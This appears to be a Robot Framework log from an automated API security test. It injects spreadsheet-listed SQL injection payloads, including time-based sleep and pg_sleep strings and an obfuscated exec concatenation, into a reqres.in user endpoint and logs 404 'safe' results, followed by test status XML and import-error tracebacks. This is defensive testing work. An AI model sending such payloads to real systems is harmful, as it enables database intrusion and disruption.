+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:38 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf7e93000073517e9da000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=7CA65SctqmH4ITcV56CP2LtxSFgNf1CItbpr%2BZt3AAL5lCEKQHyFn%2BQnPgrZZefx464p4vK9JJQdXw34XM%2Bx3kiBS30XmXGiw%2B67LQvl0JLzfPHk7HSs"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3510ec8a7351-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 17 = " or sleep(%s)=\'"%(r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:38 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'16\', \'cf-request-id\': \'0a58bf802100000eec0c3f9000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=s8pg6A7HcNxZWOZB2k%2FCu2qT2hhK1N9O40DIytRdw6BG%2FSOB2G6Y3hwgDY%2BZCwm0Rx4C0x28p4EgiciKTXFORXIuF5tRBGBkdzewMWWLKhK3HF4JmWaH"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e351369ef0eec-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2" or sleep(%s)=\'"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:38 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf809800002dffa61dc000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=3Be1Cwv6evdAu5fqMU9XBlS1RcnEvsSNsQpoJhe%2FAyAucZarZ557kOtl4Pn6q4Not3WABh%2Fk7hci9vWpi2%2F9DrW6NAi4BJplzWv1Omq%2BvEDDZUGBMU3a"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3514293f2dff-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 " or sleep(%s)=\'"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:38 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf821b000031949fade000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=Lx9KwQrBksHXBEmVNtdatngzW2HsyL9F%2FWiC5uU7XEX9PU0G%2FTsXyoInKh9wIU4TTs%2FwpU0x80hrEmwCAPNAISNYpnQ%2FGSVzk3B4y%2BR7Xt%2FAdABG2%2F9i"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e35169d1c3194-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 18 = "%s' AND userid IS NULL; --"%(r_string(10))
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:39 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'17\', \'cf-request-id\': \'0a58bf83aa00000f00ff110000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=WuaugRmDrq9F5XvFLjdv1CT6e4GqcLU3qnOozDMViXLZd40GkeyrcQxCKtCmHjKHbdmwiDssOGFD8QPCbKW9%2FlI2w0i7U0ijGxoZO7aqKT7Qb1SyimEu"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e35191be80f00-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"%s' AND userid IS NULL; --"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:39 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf8407000031d5fcbd4000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=oRhu8z%2Fi6F9ag43RTr41KN7rlRaVn%2FAVYcQvvXQinSk0ACaEFTvsUeKnj5wPk1XVy9qMmYc1tNIi3kUYYij3LLMr430t8%2B%2Byo%2FACsx1Dm2H2Pfdoyi0F"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3519a8f531d5-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "%s' AND userid IS NULL; --"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:39 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf85840000d5d4b20f6000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=zwY%2BQmPOXldLpxgj3S3f8NDh2go83wQqthFiy6DQQSdsfx%2F4HVxzCa1aa4a39K1Fp1vRubs4b5Ap0GBLZMQP%2B%2FXCYp453wcL5VzvS20zrJ2LeYmI6VzU"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e351c0da5d5d4-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 19 = "\") or pg_sleep(%s)--"%(r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:39 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'17\', \'cf-request-id\': \'0a58bf86f600000ec48c0a8000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=M2Bf84VkDQ7lVf5Kocr%2FsVDGbpgRJAdZd3wsfjlaCHzE2YrXYPQZiFbHm9NYgwLj1Qgu6qwvXy6IrV2azrogCiZqQ%2FqF%2Fg4YtU7WBWk4%2FcDo1V1ElaP2"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e351e5c360ec4-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"\") or pg_sleep(%s)--"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:40 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf87590000321ecc943000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=C8%2BXtdC43TbbDD9b728U9E3Yl1sxZt7cq5KyYp0Y4Pz4vwOi8MtHp2SdMn0GIV2UdxA2xNfWKv3qKY9ppReuFrjRGpK8DUiYEkNXsSoU1nl3ESN9qEnL"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e351efdce321e-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "\") or pg_sleep(%s)--"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:40 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf88b900002e6a5a10c000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=bHtR74Agg3lcjldiPFz6jfZN2uADGVuNlt%2FbUi4hWAQ3kfVZzxWM8z392PLCbSRSVOf6Ng5dt7KqgtcDAkU8INHyUfP0XipMNfRQ%2FGr6IccFTrtxeIKO"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e35212ed52e6a-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 20 = "; exec (\'sel\' + \'ect us\' + \'er\')"
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:40 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'18\', \'cf-request-id\': \'0a58bf8a3f000031874f30a000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=It8Mnc9B3HcW7tJ4ylAY9PnGgfMGIOjEDpFqPpXY4aSPrbIsBFzjPUsOyYhTiST8B%2BFHx0H%2FWNcUOYhzgAgCL2RAy2eD8MMRjP88s2aXOb0z6t6YEyvN"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e35239d8f3187-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"; exec (\'sel\' + \'ect us\' + \'er\')"
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:41 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf8ace00000efcb5065000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=Oy9u538HUIcpum1UVrGjpBLNQrUVcKykV7Ny%2B8%2BqZ0kyA9oGg97IQB7085t8jd72dT21PK65cQzPqWMyJyrU1qo2%2B1NYZYN1FKiF%2FNRlS6m6mWs3wuy%2B"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e352479a60efc-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "; exec (\'sel\' + \'ect us\' + \'er\')"
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:41 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf8c8e000032285183f000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=DM%2B%2Be63C%2FdmZQKZnA4%2FwPz5sBePfTid4lJGB6RcaUdQetjjAooroaA3%2BofoqTL0cJieqrEauhzLWsZn%2BqPMgPGW8FFkVo70ORLToyrAMX%2FCQXQwLOcjD"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e352749b43228-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 21 = None
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:41 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'19\', \'cf-request-id\': \'0a58bf8e1200006989db1f5000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=O7rU1QCO205Ol8%2Fs0EekCzvC29RISBEQ4o2rZMl%2F%2BMVCmj%2BRWAcYIsNUsSSLE8jqzj2iqRs9TCzJ4qlkstxHnh3Sqn3V75roQcm19EqvSLusgCF3BTNW"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3529bc826989-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2None
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:42 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf8e8200000f1016962000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=IfGzLnytLSagRjo%2B6yHxca2PAHvv0MItIItIkCVLxpL9r7WFPB4Kj55vhPRpQxzbdSc2jUPE4jRo6x1sRwzXdxtwYar8tCPaXq9%2FxL2ZYfeC1czTbzVS"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e352a6d5d0f10-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 None
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:42 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf907000000e9420044000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=4Q2Y%2FghTWc7RrzlRLCsF3eQvYcaXEdB1uI2Hh3%2F1tuNGcKrLNBfWkfnvFeCdyy7osXFsc7%2Fb0ymeYC3rNA3jmyd69vcv6sRBozQ8U3ULX%2BQ5v%2FzBMLir"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e352d8f660e94-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}</msg>
+<msg timestamp="20210529 13:33:43.348" level="INFO">${result} = {'StatusCode': '200', 'ResponseBody': '{"data":{"id":2,"email":"janet.weaver@reqres.in","first_name":"Janet","last_name":"Weaver","avatar":"https://reqres.in/img/faces/2-image.jpg"},"support":{"url":"...</msg>
+<status status="PASS" starttime="20210529 13:33:22.616" endtime="20210529 13:33:43.348"/>
+</kw>
+<kw name="Log To Console" library="BuiltIn">
+<arg>${result}</arg>
+<doc>Logs the given message to the console.</doc>
+<status status="PASS" starttime="20210529 13:33:43.349" endtime="20210529 13:33:43.357"/>
+</kw>
+<kw name="List Should Not Contain Value" library="Collections">
+<arg>${result}</arg>
+<arg>200</arg>
+<doc>Fails if the ``value`` is found from ``list``.</doc>
+<status status="PASS" starttime="20210529 13:33:43.358" endtime="20210529 13:33:43.361"/>
+</kw>
+<kw name="List Should Not Contain Value" library="Collections">
+<arg>${result}</arg>
+<arg>201</arg>
+<doc>Fails if the ``value`` is found from ``list``.</doc>
+<status status="PASS" starttime="20210529 13:33:43.362" endtime="20210529 13:33:43.363"/>
+</kw>
+<kw name="List Should Not Contain Value" library="Collections">
+<arg>${result}</arg>
+<arg>202</arg>
+<doc>Fails if the ``value`` is found from ``list``.</doc>
+<status status="PASS" starttime="20210529 13:33:43.363" endtime="20210529 13:33:43.364"/>
+</kw>
+<status status="PASS" starttime="20210529 13:33:22.610" endtime="20210529 13:33:43.365"/>
+</kw>
+<status status="PASS" starttime="20210529 13:33:22.586" endtime="20210529 13:33:43.368"/>
+</test>
+<status status="PASS" starttime="20210529 13:33:21.394" endtime="20210529 13:33:43.377"/>
+</suite>
+<statistics>
+<total>
+<stat pass="1" fail="0" skip="0">All Tests</stat>
+</total>
+<tag>
+</tag>
+<suite>
+<stat pass="1" fail="0" skip="0" id="s1" name="Mysqldb">Mysqldb</stat>
+</suite>
+</statistics>
+<errors>
+<msg timestamp="20210529 13:33:21.457" level="ERROR">Error in file 'D:\COE_Automation\Resources\API.robot' on line 2: Importing library 'SeleniumLibrary' failed: ModuleNotFoundError: No module named 'SeleniumLibrary'
+Traceback (most recent call last):
+  None
+PYTHONPATH:
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\Scripts\robot.exe
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39
+  c:\users\palak.vora\appdata\local\programs\python\python39\python39.zip
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\DLLs
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib
+  C:\Users\palak.vora\AppData\Roaming\Python\Python39\site-packages
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib\site-packages</msg>
+<msg timestamp="20210529 13:33:21.461" level="ERROR">Error in file 'D:\COE_Automation\Resources\API.robot' on line 3: Importing library 'JSpringBotGlobal' failed: ModuleNotFoundError: No module named 'JSpringBotGlobal'
+Traceback (most recent call last):
+  None
+PYTHONPATH:
